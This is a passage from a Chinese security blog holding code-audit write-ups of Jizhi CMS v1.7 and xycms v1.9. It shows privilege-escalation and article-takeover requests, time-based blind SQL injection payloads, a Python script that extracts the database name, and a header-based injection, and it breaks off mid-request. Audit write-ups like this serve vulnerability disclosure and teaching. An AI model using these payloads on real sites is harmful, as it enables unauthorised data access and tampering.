class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'title'</span>,<span class="number">1</span>)!=<span class="string">''</span>)&#123;</span><br><span class="line">    $sql.=<span class="string">" and title like '%"</span>.<span class="keyword">$this</span>-&gt;frparam(<span class="string">'title'</span>,<span class="number">1</span>).<span class="string">"%' "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'shuxing'</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'shuxing'</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">$sql.=<span class="string">" and istop=1 "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'shuxing'</span>)==<span class="number">2</span>)&#123;</span><br><span class="line">$sql.=<span class="string">" and ishot=1 "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'shuxing'</span>)==<span class="number">3</span>)&#123;</span><br><span class="line">$sql.=<span class="string">" and istuijian=1 "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$data = $page-&gt;where($sql)-&gt;orderby(<span class="string">'istop desc,orders desc,id desc'</span>)-&gt;limit(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'limit'</span>,<span class="number">0</span>,<span class="number">10</span>))-&gt;page(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'page'</span>,<span class="number">0</span>,<span class="number">1</span>))-&gt;go();</span><br><span class="line">$ajaxdata = [];</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($v[<span class="string">'ishot'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">$v[<span class="string">'tuijian'</span>] = <span class="string">'热'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($v[<span class="string">'istuijian'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">$v[<span class="string">'tuijian'</span>] = <span class="string">'荐'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($v[<span class="string">'istop'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">$v[<span class="string">'tuijian'</span>] = <span class="string">'顶'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$v[<span class="string">'tuijian'</span>] = <span class="string">'无'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这里是三种状态，<code>ishot=1</code>代表热，<code>istuijian=1</code>代表荐，<code>istop=1</code>代表顶，如果什么都没有那就是无</p><p>所以只需要在用户发布文章的地方添加字段<code>ishot=1</code>或者<code>istuijian=1</code>或者<code>istop=1</code>即可</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/release.html</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.**.net</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 119</span><br><span class="line"><span class="attribute">Origin</span>: http://www.**.net</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://www.**.net/user/release.html</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=6jgmku4kuk71mdljmai77cj432</span><br><span class="line"></span><br><span class="line">ajax=1&amp;isshow=&amp;molds=article&amp;tid=2&amp;title=hot&amp;keywords=hoht&amp;litpic=&amp;description=hot&amp;body=%3Cp%3Ehot%3Cbr%2F%3E%3C%2Fp%3E&amp;ishot=1</span><br></pre></td></tr></table></figure><h2 id="第四处逻辑漏洞——越权修改别人已发表的文章为未审核"><a href="#第四处逻辑漏洞——越权修改别人已发表的文章为未审核" class="headerlink" title="第四处逻辑漏洞——越权修改别人已发表的文章为未审核"></a>第四处逻辑漏洞——越权修改别人已发表的文章为未审核</h2><p><code>/Home/c/UserController.php</code>中的<code>release()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//文章发布和修改</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">release</span><span class="params">()</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">    $molds = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'molds'</span>,<span class="number">1</span>,<span class="string">'article'</span>);</span><br><span class="line">    $tid = <span class="keyword">$this</span>-&gt;frparam(<span class="string">'tid'</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;frparam(<span class="string">'id'</span>))&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = M($molds)-&gt;find([<span class="string">'id'</span>=&gt;<span class="keyword">$this</span>-&gt;frparam(<span class="string">'id'</span>),<span class="string">'member_id'</span>=&gt;<span class="keyword">$this</span>-&gt;member[<span class="string">'id'</span>]]);</span><br><span class="line">    $molds = <span class="keyword">$this</span>-&gt;data[<span class="string">'molds'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;moldsdata = M(<span class="string">'molds'</span>)-&gt;find([<span class="string">'biaoshi'</span>=&gt;$molds]);</span><br><span class="line">    $tid = <span class="keyword">$this</span>-&gt;data[<span class="string">'tid'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;molds = $molds;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;tid = $tid;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;classtypetree =  get_classtype_tree();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;display(<span class="keyword">$this</span>-&gt;template.<span class="string">'/user/article-add'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上述代码第10行至第21行，<code>if($this-&gt;frparam(&#39;id&#39;))</code>这里对id并没有判断到底是改用户的文章还是其他用户对文章，导致可以对任意用户对文章进行修改，即把他们的文章变成自己的文章</p><p>下面是演示结果：</p><p>这里首先需要你发表过文章，不需要审核，只需要发布即可。然后进入编辑模式，点提交，抓包</p><p><img src="http://images.xianyu123.club/20200603184408.png" alt="image-20200603184407958"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/release.html</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.**.net</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 117</span><br><span class="line"><span class="attribute">Origin</span>: http://www.**.net</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://www.**.net/user/release/id/29/molds/article.html</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=lcfjs54o8288d6q68julppqu60</span><br><span class="line"></span><br><span class="line">ajax=1&amp;id=29&amp;isshow=0&amp;molds=article&amp;tid=2&amp;title=1&amp;keywords=1&amp;litpic=&amp;description=1&amp;body=%3Cp%3E1%3Cbr%2F%3E%3C%2Fp%3E</span><br></pre></td></tr></table></figure><p>修改上面的post参数中的id数值，把id改成任意数字，如果文章存在，就会从那个用户中消失，然后变成了你的文章，比如我们把id改成13</p><p><img src="http://images.xianyu123.club/20200603184511.png" alt="image-20200603184511398"></p><p>原本这篇文章是正常的，且我的投稿中并没有这篇文章</p><p><img src="http://images.xianyu123.club/20200520224526.png" alt="image-20200520224526063"></p><p>然后发包</p><p><img src="http://images.xianyu123.club/20200603184614.png" alt="image-20200603184614304"></p><p>后台刷新即可看到这篇文章的状态</p><p><img src="http://images.xianyu123.club/20200520224625.png" alt="image-20200520224625465"></p><p>然后我们本地就多了一篇文章</p><p><img src="http://images.xianyu123.club/20200520224652.png" alt="image-20200520224652810"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>这个cms比较有意思的一点就是获取ip的函数<code>GetIP()</code>，这里可以用http头<code>CDN-SRC-IP</code>绕过导致可以触发存储型xss和sql注入</li><li>其实这里sql注入可以往数据库插入文件的白名单后缀，比如php，这样就可以直接上传php文件（不知道为什么开发者要把文件后缀写到数据库中）</li><li>这里的xss漏洞是比较泛滥的，而且函数中是有针对xss过滤的函数，不知道为什么开发者没有使用</li><li>这里的逻辑漏洞也是很泛滥的，主要挖掘的思路就是去测试功能点，然后去看功能点的代码，这样基本上就不会有遗漏的漏洞</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于先知社区——&lt;a href=&quot;https://xz.aliyun.com/t/7872&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;极致cms v1.7的一次审计&lt;/a&gt;，转载时请标明出处&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>xycms v1.9的一次审计</title>
    <link href="http://0clickjacking0.github.io/2020/06/18/xycms%20v1.9%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1/"/>
    <id>http://0clickjacking0.github.io/2020/06/18/xycms v1.9的一次审计/</id>
    <published>2020-06-18T03:01:59.000Z</published>
    <updated>2020-08-24T02:23:57.961Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知社区——<a href="https://xz.aliyun.com/t/7557" target="_blank" rel="noopener">xycms v1.9的一次审计</a>，转载时请标明出处</p><a id="more"></a><p>记一次xycms v1.9的审计，文章有写的不好的地方，大佬们轻喷。</p><h1 id="网站目录结构"><a href="#网站目录结构" class="headerlink" title="网站目录结构"></a>网站目录结构</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">├── Conf（连接数据库的一些配置文件）</span><br><span class="line">├── Libs（一些公共函数）</span><br><span class="line">├── Statics（js的一些静态文件）</span><br><span class="line">├── Style（css样式）</span><br><span class="line">├── add_book.php</span><br><span class="line">├── add_do.php</span><br><span class="line">├── code.php</span><br><span class="line">├── foot.php</span><br><span class="line">├── index.php</span><br><span class="line">├── install（网站安装目录）</span><br><span class="line">├── system（网站后台，审计的重点）</span><br><span class="line">└── top.php</span><br></pre></td></tr></table></figure><h1 id="后台SQL注入漏洞"><a href="#后台SQL注入漏洞" class="headerlink" title="后台SQL注入漏洞"></a>后台SQL注入漏洞</h1><h2 id="第一处sql注入"><a href="#第一处sql注入" class="headerlink" title="第一处sql注入"></a>第一处sql注入</h2><p><code>/system/add_book_class.php</code>，关键代码如下，这里没有任何的过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"act"</span>]==ok)&#123;</span><br><span class="line">$siteinfo = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'title'</span> =&gt; $_POST[<span class="string">'title'</span>],</span><br><span class="line"><span class="string">'c_order'</span> =&gt; $_POST[<span class="string">'c_order'</span>]</span><br><span class="line">);</span><br><span class="line">$db-&gt;insert(<span class="string">"****cms_book_class"</span>, $siteinfo);</span><br><span class="line"><span class="comment">//$db-&gt;close();</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script language='javascript'&gt;"</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"alert('恭喜您,信息内容添加成功!');"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">" location='manage_book_class.php';"</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>insert函数在<code>/Libs/Class/mysql.class.php</code>，内容如下，这里也并没有对插入数据库的函数进行过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($tableName, $column = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">         $columnName = <span class="string">""</span>;</span><br><span class="line">         $columnValue = <span class="string">""</span>;</span><br><span class="line">         <span class="keyword">foreach</span> ($column <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">             $columnName .= $key . <span class="string">","</span>;</span><br><span class="line">             $columnValue .= <span class="string">"'"</span> . $value . <span class="string">"',"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         $columnName = substr($columnName, <span class="number">0</span>, strlen($columnName) - <span class="number">1</span>);</span><br><span class="line">         $columnValue = substr($columnValue, <span class="number">0</span>, strlen($columnValue) - <span class="number">1</span>);</span><br><span class="line">         $sql = <span class="string">"INSERT INTO $tableName($columnName) VALUES($columnValue)"</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system/add_book_class.php?act=ok</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:81</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 93</span><br><span class="line"><span class="attribute">Origin</span>: http://localhost:81</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost:81/system/add_book_class.php</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=npvaign44srcvlhjglh9srrqo6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">title=',case when (ascii(mid((database()),1,1))&lt;127) then (sleep(5)) else (1) end)#&amp;c_order=1</span><br></pre></td></tr></table></figure><p>这里<code>title</code>和<code>c_order</code>参数都存在sql注入</p><p>获取数据库名的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://localhost:81/system/add_book_class.php?act=ok'</span></span><br><span class="line"><span class="comment"># 这里省去了登录的爬虫，因为存在验证码，ocr比较麻烦，所以登录成功后，把cookie替换一下即可</span></span><br><span class="line">cookie = &#123;<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=npvaign44srcvlhjglh9srrqo6'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search_sql</span><span class="params">(start,end,payload,length=<span class="number">2</span>)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        left = start</span><br><span class="line">        right = end</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mid == left:</span><br><span class="line">                name += chr(mid)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            full_payload = payload.format(num1=str(i),num2=str(mid))</span><br><span class="line">            requests.post(url=url,data=&#123;<span class="string">'title'</span>:full_payload,<span class="string">'c_order'</span>:<span class="string">'1'</span>&#125;,headers=cookie)</span><br><span class="line">            print(full_payload)</span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破库名长度</span></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line">database_length_payload = <span class="string">"',case when (ascii(mid((length(database())),&#123;num1&#125;,1))&lt;&#123;num2&#125;) then (sleep(3)) else (1) end)#"</span></span><br><span class="line">database_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,database_length_payload,<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'database_length:'</span>+database_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破库名</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">database_payload = <span class="string">"',case when (ascii(mid((database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;) then (sleep(3)) else (1) end)#"</span></span><br><span class="line">print(<span class="string">'database_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,database_payload,int(database_length)))</span><br></pre></td></tr></table></figure><h2 id="第二处sql注入"><a href="#第二处sql注入" class="headerlink" title="第二处sql注入"></a>第二处sql注入</h2><p><code>/system/loginpass.php</code>关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">$login_ip=getIp();</span><br><span class="line">  $sql=<span class="string">"select * from admin_user where u_name='"</span>.$m_name.<span class="string">"' and u_pwd='"</span>.$m_pwd.<span class="string">"'"</span>;</span><br><span class="line">  $result=$db-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>(!mysql_num_rows($result)==<span class="number">0</span>)&#123;</span><br><span class="line">    $_SESSION[<span class="string">"m_name"</span>] = $m_name;</span><br><span class="line">$db-&gt;query(<span class="string">"UPDATE admin_user SET login_nums=login_nums+1 where u_name='"</span>.$m_name.<span class="string">"'"</span>);</span><br><span class="line">$login_info=<span class="keyword">array</span>(</span><br><span class="line">   <span class="string">'u_name'</span>=&gt;$m_name,</span><br><span class="line">   <span class="string">'login_date'</span>=&gt;strtotime(date(<span class="string">'Y-m-d'</span>)),</span><br><span class="line">   <span class="string">'login_ip'</span>=&gt;$login_ip</span><br><span class="line">);</span><br><span class="line">$db-&gt;insert(<span class="string">"admin_login_log"</span>,$login_info);</span><br><span class="line">$db-&gt;close();</span><br><span class="line">ok_info(<span class="string">'***cms.php'</span>,<span class="string">'恭喜您，登陆成功!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><code>getIp()</code>函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"HTTP_CLIENT_IP"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_CLIENT_IP"</span>), <span class="string">"unknown"</span>))</span><br><span class="line">        $ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> (getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>), <span class="string">"unknown"</span>))</span><br><span class="line">            $ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">if</span> (getenv(<span class="string">"REMOTE_ADDR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"REMOTE_ADDR"</span>), <span class="string">"unknown"</span>))</span><br><span class="line">                $ip = getenv(<span class="string">"REMOTE_ADDR"</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">"unknown"</span>))</span><br><span class="line">                    $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    $ip = <span class="string">"unknown"</span>;</span><br><span class="line">    <span class="keyword">return</span> ($ip);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对ip没有做任何的过滤限制，我们可以用http头<code>X-Forwarded-For</code>，对输入的ip进行控制，也就是说，<code>loginpass.php</code>中的变量<code>$login_ip</code>是可控的</p><p><code>insert</code>函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($tableName, $column = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">         $columnName = <span class="string">""</span>;</span><br><span class="line">         $columnValue = <span class="string">""</span>;</span><br><span class="line">         <span class="keyword">foreach</span> ($column <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">             $columnName .= $key . <span class="string">","</span>;</span><br><span class="line">             $columnValue .= <span class="string">"'"</span> . $value . <span class="string">"',"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         $columnName = substr($columnName, <span class="number">0</span>, strlen($columnName) - <span class="number">1</span>);</span><br><span class="line">         $columnValue = substr($columnValue, <span class="number">0</span>, strlen($columnValue) - <span class="number">1</span>);</span><br><span class="line">         $sql = <span class="string">"INSERT INTO $tableName($columnName) VALUES($columnValue)"</span>;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;query($sql);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>这里对插入的数据也没有做任何限制</p><p>payload如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/system/loginpass.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost:81</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 33</span><br><span class="line"><span class="attribute">Origin</span>: http://localhost:81</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost:81/system/index.php</span><br><span class="line"><span 